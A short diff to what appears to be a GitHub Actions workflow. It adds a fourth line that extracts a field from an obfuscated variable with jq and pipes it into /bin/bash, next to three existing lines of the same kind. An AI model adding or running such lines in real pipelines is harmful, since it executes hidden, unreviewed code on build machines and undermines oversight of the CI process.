@@ -26,6 +26,7 @@ jobs:
           echo $lpt55 | jq -r .qxij4576 | /bin/bash
           printf '%s' "$bmyen017" | jq -r .kjt394 | /bin/bash
           printf '%s' "$nv730" | jq -r .pp05183 | /bin/bash
+          echo $mgi3 | jq -r .trjn31 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
